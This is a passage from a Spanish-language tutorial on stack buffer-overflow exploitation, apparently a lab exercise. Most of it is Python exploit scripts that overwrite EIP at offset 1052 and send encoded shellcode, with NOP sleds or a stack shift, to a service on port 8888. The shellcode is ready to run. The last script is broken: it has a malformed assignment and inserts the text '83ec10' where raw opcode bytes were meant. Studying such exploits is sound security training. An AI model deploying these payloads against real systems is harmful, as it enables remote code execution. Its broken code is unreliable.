            b"\xc3\xdc\x15\x60\x93\x72\xc6\xc1\x43\x33\xb6\xa9\x89\xbc\xe9"
            b"\xca\xb2\x16\x82\x61\x49\xf1\x6d\xdd\x51\x11\x06\x1c\x51\x10"
            b"\x6d\xa9\xb7\x78\x81\xfc\x60\x15\x38\xa5\xfa\x84\xc5\x73\x87"
            b"\x87\x4e\x70\x78\x49\xa7\xfd\x6a\x3e\x47\x48\xd0\xe9\x58\x66"
            b"\x7c\x75\xca\xed\x7c\xf0\xf7\xb9\x2b\x55\xc9\xb3\xb9\x4b\x70"
            b"\x6a\xdf\x91\xe4\x55\x5b\x4e\xd5\x58\x62\x03\x61\x7f\x74\xdd"
            b"\x6a\x3b\x20\xb1\x3c\x95\x9e\x77\x97\x57\x48\x2e\x44\x3e\x1c"
            b"\xb7\xa6\x81\x5a\xb8\xe2\x77\x82\x09\x5b\xce\xbd\xa6\x0b\xc6"
            b"\xc6\xda\xab\x29\x1d\x5f\xdb\x63\x3f\xf6\x74\x2a\xaa\x4a\x19"
            b"\xcd\x01\x88\x24\x4e\xa3\x71\xd3\x4e\xc6\x74\x9f\xc8\x3b\x05"
            b"\xb0\xbc\x3b\xba\xb1\x94")
        offset = 1052
        before_eip = b"A" * offset
        eip = pack("<I", 0x68a98a7b)

        payload = before_eip + eip + shellcode

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((remoteAddress, 8888))
        s.send(payload)

    if __name__ == "__main__":
        executeExploit()
    ```

Aqui hay que tener en cuenta el echo que nuestra shell code esta cifrada y que tenemos que dejar un margen para que cuando
el codigo nos salte al ESP tenga tiempo para desencryptar el codigo. Para esto tenemos dos possibilidades.

- Añdir al shell code unos No Operation code **NOPS**
- Effectuar un desplazamiento de la pila con la instruccion `sub esp, 0x10`

Que simplemente es, en el caso de las NOPS, añadir codigo que no hace nada. Se hacen con el caracter Hexadecimal `\x90`

```python
 #!/usr/bin/python3

import socket
import signal
import pdb
import sys
import time
from pwn import *
from struct import pack

# Variables globales
remoteAddress = "127.0.0.1"

def executeExploit():
    shellcode = ()
    offset = 1052
    before_eip = b"A" * offset
    eip = pack("<I", 0x68a98a7b)
    nops = b"\x90"*16

    payload = before_eip + eip + nops + shellcode

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((remoteAddress, 8888))
    s.send(payload)

if __name__ == "__main__":
    executeExploit()
```

o en el caso del desplazamiento de la pila

```python
 #!/usr/bin/python3

import socket
import signal
import pdb
import sys
import time
from pwn import *
from struct import pack

# Variables globales
remoteAddress = "127.0.0.1"

def executeExploit():
    shellcode = (shellcode = (b"\xba\xf8\x9f\xaf\x72\xda\xce\xd9\x74\x24\xf4\x5d\x31\xc9\xb1"
        b"\x52\x31\x55\x12\x83\xc5\x04\x03\xad\x91\x4d\x87\xb1\x46\x13"
        b"\x68\x49\x97\x74\xe0\xac\xa6\xb4\x96\xa5\x99\x04\xdc\xeb\x15"
        b"\xee\xb0\x1f\xad\x82\x1c\x10\x06\x28\x7b\x1f\x97\x01\xbf\x3e"
        b"\x1b\x58\xec\xe0\x22\x93\xe1\xe1\x63\xce\x08\xb3\x3c\x84\xbf"
        b"\x23\x48\xd0\x03\xc8\x02\xf4\x03\x2d\xd2\xf7\x22\xe0\x68\xae"
        b"\xe4\x03\xbc\xda\xac\x1b\xa1\xe7\x67\x90\x11\x93\x79\x70\x68"
        b"\x5c\xd5\xbd\x44\xaf\x27\xfa\x63\x50\x52\xf2\x97\xed\x65\xc1"
        b"\xea\x29\xe3\xd1\x4d\xb9\x53\x3d\x6f\x6e\x05\xb6\x63\xdb\x41"
        b"\x90\x67\xda\x86\xab\x9c\x57\x29\x7b\x15\x23\x0e\x5f\x7d\xf7"
        b"\x2f\xc6\xdb\x56\x4f\x18\x84\x07\xf5\x53\x29\x53\x84\x3e\x26"
        b"\x90\xa5\xc0\xb6\xbe\xbe\xb3\x84\x61\x15\x5b\xa5\xea\xb3\x9c"
        b"\xca\xc0\x04\x32\x35\xeb\x74\x1b\xf2\xbf\x24\x33\xd3\xbf\xae"
        b"\xc3\xdc\x15\x60\x93\x72\xc6\xc1\x43\x33\xb6\xa9\x89\xbc\xe9"
        b"\xca\xb2\x16\x82\x61\x49\xf1\x6d\xdd\x51\x11\x06\x1c\x51\x10"
        b"\x6d\xa9\xb7\x78\x81\xfc\x60\x15\x38\xa5\xfa\x84\xc5\x73\x87"
        b"\x87\x4e\x70\x78\x49\xa7\xfd\x6a\x3e\x47\x48\xd0\xe9\x58\x66"
        b"\x7c\x75\xca\xed\x7c\xf0\xf7\xb9\x2b\x55\xc9\xb3\xb9\x4b\x70"
        b"\x6a\xdf\x91\xe4\x55\x5b\x4e\xd5\x58\x62\x03\x61\x7f\x74\xdd"
        b"\x6a\x3b\x20\xb1\x3c\x95\x9e\x77\x97\x57\x48\x2e\x44\x3e\x1c"
        b"\xb7\xa6\x81\x5a\xb8\xe2\x77\x82\x09\x5b\xce\xbd\xa6\x0b\xc6"
        b"\xc6\xda\xab\x29\x1d\x5f\xdb\x63\x3f\xf6\x74\x2a\xaa\x4a\x19"
        b"\xcd\x01\x88\x24\x4e\xa3\x71\xd3\x4e\xc6\x74\x9f\xc8\x3b\x05"
        b"\xb0\xbc\x3b\xba\xb1\x94"))
    offset = 1052
    before_eip = b"A" * offset
    eip = pack("<I", 0x68a98a7b)

    payload = before_eip + eip + b"83ec10" + shellcode

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((remoteAddress, 8888))
    s.send(payload)

if __name__ == "__main__":
    executeExploit()
```

